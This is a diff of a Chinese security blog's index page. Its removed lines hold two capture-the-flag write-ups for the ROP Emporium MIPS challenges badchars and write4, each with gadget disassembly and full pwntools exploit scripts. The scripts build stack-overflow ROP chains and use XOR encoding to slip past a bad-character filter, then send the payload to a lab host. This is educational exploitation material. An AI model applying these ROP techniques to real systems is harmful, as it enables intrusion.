+<li><code>succs()</code>：获取当前基本块的所有后继基本块集合</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E6%8C%87%E4%BB%A4%E7%B2%92%E5%BA%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1041,193 +1337,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/badchars_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/badchars_mipsel/" class="post-title-link" itemprop="url">badchars_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:13:27" itemprop="dateCreated datePublished" datetime="2023-03-15T10:13:27+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:59:06" itemprop="dateModified" datetime="2023-04-11T13:59:06+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>pwnme反编译代码如下，可以看到会对写入的缓冲区逐个字节进行检查，如果包含x、g、a、.字符，则替换成0xEB。<br>在程序中含有print_file函数，因此大概的思路是需要使用ROP带参数flag.txt调用print_file函数，同时需要找一个方法来规避pwnme函数对缓冲区中数字的过滤。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;MIPS\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  len = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )  <span class="comment">// 对写入缓冲区中的数据进行检查，如果有badchar，则替换</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">0xEB</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>通过看官方内置的gadgets，大概的思路应该是，先将ROP异或某个数写入到缓冲区，然后控制流劫持后，再使用异或恢复缓冲区。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               usefulGadgets:</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400944</span><br><span class="line">.text:00400948 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:0040094C 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400950 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:00400954 00 00 2A 8D                   lw      $t2, 0($t1)</span><br><span class="line">.text:00400958 26 40 0A 01                   xor     $t0, $t2</span><br><span class="line">.text:0040095C 00 00 28 AD                   sw      $t0, 0($t1)</span><br><span class="line">.text:00400960 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400964 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400964</span><br><span class="line">.text:00400968 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:0040096C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400970 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400974 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class="line">.text:00400974</span><br><span class="line">.text:00400978 00 00 00 00                   nop</span><br><span class="line">.text:0040097C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
-<p>可以将该gadget分成三段：<br>第一段：write_to_addr，负责写入4个字节到data段中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               write_to_addr</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)  # 下个gadget地址</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)    # 写入目标地址</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)    # 写入的数据</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br></pre></td></tr></table></figure>
-<p>第二段：xor_decrypt，负责对指定地址的4个字节进行xor解密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00400948                               xor_decrypt</span><br><span class="line">.text:00400948 0C 00 B9 8F                   lw      $t9, 0xC($sp)  # 下个gadget地址</span><br><span class="line">.text:0040094C 08 00 A8 8F                   lw      $t0, 8($sp)    # xor解密key</span><br><span class="line">.text:00400950 04 00 A9 8F                   lw      $t1, 4($sp)    # 数据地址</span><br><span class="line">.text:00400954 00 00 2A 8D                   lw      $t2, 0($t1)</span><br><span class="line">.text:00400958 26 40 0A 01                   xor     $t0, $t2</span><br><span class="line">.text:0040095C 00 00 28 AD                   sw      $t0, 0($t1)</span><br><span class="line">.text:00400960 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400964 10 00 BD 23                   addi    $sp, 0x10</span><br></pre></td></tr></table></figure>
-<p>第三段：print_file，带参数调用print_file函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00400968 08 00 A4 8F                   lw      $a0, 8($sp)  # flag.txt地址</span><br><span class="line">.text:0040096C 04 00 B9 8F                   lw      $t9, 4($sp)  # print_file函数 </span><br><span class="line">.text:00400970 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400974 0C 00 BD 23                   addi    $sp, 0xC</span><br></pre></td></tr></table></figure>
-<p>ROP构造如下：<br>先填充到返回地址，ra保存在SP+0x4C，缓冲区位于SP+0x28，因此需要填充0x24，才能覆盖返回地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br></pre></td></tr></table></figure>
-<p>badchars &#x3D;  ‘.’, ‘a’, ‘g’, ‘x’ &#x3D; 0x2e, 0x61, 0x67, 0x78，可以采用如下的脚本去选择一个key来和字符串进行异或：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">badchars = <span class="string">b&quot;.agx&quot;</span></span><br><span class="line">flag_txt = <span class="string">b&quot;flag.txt&quot;</span></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> flag_txt:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> each ^ i <span class="keyword">not</span> <span class="keyword">in</span> badchars:</span><br><span class="line">            key += <span class="built_in">str</span>(<span class="built_in">hex</span>(i)) + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(each), <span class="built_in">hex</span>(i ^ each), <span class="built_in">chr</span>(i ^ each))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>, key)</span><br></pre></td></tr></table></figure>
-<p>继续构造ROP，将xor_flag分两次通过第一个gadget写入到data段上。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rop += p32(write_to_addr)</span><br><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x66\x6c\x60\x66&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += p32(write_to_addr)</span><br><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x2f\x74\x79\x74&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += p32(xor_decrypt)</span><br></pre></td></tr></table></figure>
-<p>此时就规避了程序对于关键字符的过滤，那么在执行ROP的时候还需要对该字符串进行解密</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x00\x00\x01\x01&quot;</span></span><br><span class="line">rop += p32(xor_decrypt)</span><br><span class="line"><span class="comment"># 栈平衡完成</span></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x01\x00\x01\x00&quot;</span></span><br><span class="line">rop += p32(print_file)</span><br></pre></td></tr></table></figure>
-<p>解密完成后，调用print_file函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./badchars_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">write_to_addr = <span class="number">0x00400930</span></span><br><span class="line">xor_decrypt = <span class="number">0x00400948</span></span><br><span class="line">print_file = <span class="number">0x00400968</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line"></span><br><span class="line">rop += p32(write_to_addr)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x66\x6c\x60\x66&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += p32(write_to_addr)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += <span class="string">b&quot;\x2f\x74\x79\x74&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += p32(xor_decrypt)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x00\x00\x01\x01&quot;</span></span><br><span class="line">rop += p32(xor_decrypt)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line">rop += <span class="string">b&quot;\x01\x00\x01\x00&quot;</span></span><br><span class="line">rop += p32(print_file)</span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span> </span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&#x27;print_file&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./raw&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(rop)</span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>结果如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 badchars.py</span></span><br><span class="line">[*] &#x27;/home/utest/Code/mipsrop/badchars_mipsel/badchars_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/write4_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/write4_mipsel/" class="post-title-link" itemprop="url">write4_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:12:54" itemprop="dateCreated datePublished" datetime="2023-03-15T10:12:54+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 14:03:04" itemprop="dateModified" datetime="2023-04-11T14:03:04+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>目的：调用print_file函数，将flag路径作为参数传递，然后打印出来。难点在于如何将flag路径布置到栈上，并且将路径字符串指针作为参数传递。<br>程序内部提供了一个usefulGadgets，应该可以分为两个gadget，第二个gadget_print是用来传递路径并执行print_file函数的。<br>第一个gadget_write的作用大概是，从栈上SP+8取出4个字节，并写入到栈上SP+4存储的地址中，最后跳转到SP+0xC继续执行，并调整栈。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               usefulGadgets:</span><br><span class="line">.text:00400930 0C 00 B9 8F                   lw      $t9, 0xC($sp)</span><br><span class="line">.text:00400934 08 00 A8 8F                   lw      $t0, 8($sp)</span><br><span class="line">.text:00400938 04 00 A9 8F                   lw      $t1, 4($sp)</span><br><span class="line">.text:0040093C 00 00 09 AD                   sw      $t1, 0($t0)</span><br><span class="line">.text:00400940 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400944 10 00 BD 23                   addi    $sp, 0x10</span><br><span class="line">.text:00400944</span><br><span class="line">.text:00400948 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:0040094C 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400950 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400954 00 00 00 00                   nop</span><br><span class="line">.text:00400954</span><br><span class="line">.text:00400958 00 00 00 00                   nop</span><br><span class="line">.text:0040095C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>
-<h2 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h2><p>那么ROP的思路就是：使用第一个gadget将数据写入到某个地址，最后使用第二个gadget继续执行。</p>
-<ol>
-<li>缓冲区填充<br>分析pwnme函数，ra保存在SP+0x3C，缓冲区为SP+0x18，需要填充0x24个数据才能开始覆盖<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br></pre></td></tr></table></figure></li>
-<li>写入数据到某个地址<br>不能选择写入到栈上（或许可以其他的ROP链实现），因为写入到栈上需要额外的ROP将栈上的字符串起始地址暴露出来。此处选择程序的某个可写的Section来写入数据，这样地址完全可控。写入数据就是”flag.txt”一共8个字节，需要调用两次gadget_wirte。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;flag&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;.txt&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line"></span><br><span class="line">rop += (gadget_print)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += p32(print_file)</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./write4_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">gadget_write = <span class="number">0x00400930</span></span><br><span class="line">gadget_print = <span class="number">0x00400948</span></span><br><span class="line">print_file = ELF.symbols[<span class="string">&#x27;print_file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;flag&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(gadget_write)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += <span class="string">b&quot;.txt&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x00411004</span>)</span><br><span class="line"></span><br><span class="line">rop += p32(gadget_print)</span><br><span class="line">rop += <span class="string">b&quot;B&quot;</span> * <span class="number">0x4</span></span><br><span class="line">rop += p32(print_file)</span><br><span class="line">rop += p32(<span class="number">0x00411000</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>结果如下：</p>
